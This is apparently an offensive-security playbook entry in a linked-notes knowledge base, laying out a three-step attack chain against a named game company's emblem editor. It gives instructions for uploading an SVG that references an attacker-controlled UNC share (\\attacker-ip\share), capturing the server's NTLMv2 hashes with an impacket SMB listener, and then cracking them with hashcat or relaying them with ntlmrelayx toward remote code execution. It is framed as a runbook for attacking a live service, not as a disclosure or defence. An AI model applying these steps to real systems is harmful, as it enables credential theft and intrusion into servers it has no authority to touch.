---
id: ac-uuid-1234
name: >-
  SSRF via Malicious SVG Upload in Emblem Editor to Expose Domain Credentials
  and Enable RCE
tags:
  - ssrf
  - svg
  - imagemagick
  - smb
  - ntlmv2
  - credentials
  - rce
type: attack_chain
tools:
  - '[[tools/Impacket]]'
tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Craft-and-Submit-Malicious-SVG-with-UNC-Paths]]'
  - '[[procedures/Set-Up-SMB-Listener-to-Capture-Authentication]]'
  - '[[procedures/Analyze-Captured-NTLMv2-Hashes]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Adversary-in-the-Middle]]'
updated_at: '2025-12-14T03:46:09.070Z'
description: >-
  A multi-stage SSRF attack exploiting ImageMagick's processing of SVG files
  with UNC paths in Rockstar Games' emblem editor, leading to SMB connections
  that expose NTLMv2 hashes for credential cracking or relay attacks.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Adversary-in-the-Middle]]'
---
# SSRF via Malicious SVG Upload in Emblem Editor to Expose Domain Credentials and Enable RCE

Multi-stage attack chain demonstrating a complete SSRF workflow targeting the emblem editor in Rockstar Games' application, where crafted SVG files trigger outbound SMB requests via ImageMagick, exposing server credentials.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Upload Malicious SVG] --> B[Trigger SSRF via ImageMagick]
    B --> C[Capture SMB Auth]
    C --> D[Extract and Crack Hashes]
    D --> E[Relay for RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Impacket]]
- Text editor for crafting SVG

### Target Environment

- Web application with SVG upload feature (e.g., emblem editor)
- Server using ImageMagick and librsvg for SVG processing
- Open outbound access to port 445 (SMB)

### Initial Access Requirements

- Valid user account on the target web application
- Attacker-controlled server accessible via SMB (port 445)
- No prior credentials needed beyond app access

## Detailed Attack Procedures

### Step 1: Craft and Submit Malicious SVG
procedure: [[procedures/Craft-and-Submit-Malicious-SVG-with-UNC-Paths]]

**Objective**: Upload an SVG file containing UNC paths to trigger SSRF during server-side processing.

**Instructions**: Create an SVG file embedding a UNC path like `\\attacker-ip\share\image.png`. Use a text editor to craft the SVG, then submit it via the emblem editor upload endpoint.

**Expected Output**: Server processes the SVG, initiating an SMB connection to the attacker's endpoint.

**Success Indicators**:
- No upload errors
- Network traffic to attacker's SMB listener

### Step 2: Set Up SMB Listener
procedure: [[procedures/Set-Up-SMB-Listener-to-Capture-Authentication]]

**Objective**: Intercept outbound SMB requests from the server to capture authentication data.

**Instructions**: Run an SMB server using [[commands/impacket-smbserver-listen]] on the attacker machine to listen for connections on port 445.

```bash
impacket-smbserver share . -smb2support
```

Monitor logs for incoming connections and auth attempts.

**Expected Output**: Captured NTLMv2 challenge-response hashes in logs.

**Success Indicators**:
- Incoming SMB connection from target server
- Auth credentials or hashes received

### Step 3: Analyze Captured Hashes
procedure: [[procedures/Analyze-Captured-NTLMv2-Hashes]]

**Objective**: Extract and crack exposed credentials or prepare for relay attacks.

**Instructions**: Parse the captured hashes using tools like Hashcat for offline cracking, or relay them using [[commands/impacket-ntlmrelayx]] for potential RCE.

```bash
hashcat -m 5600 captured.ntlmv2 /path/to/wordlist.txt
```

**Expected Output**: Cracked passwords or successful relay to internal services.

**Success Indicators**:
- Valid credentials obtained
- Relay leading to further access or RCE

## Attack Chain Summary

### Key Achievements

1. Triggered SSRF via SVG UNC paths in ImageMagick
2. Exposed Taketwo domain credentials and NTLMv2 hashes
3. Enabled potential SMB relay for RCE on internal systems

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Adversary-in-the-Middle]] Adversary-in-the-Middle

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Credential Access]] Credential Access

---
*Last updated: 2023-10-01T00:00:00Z*
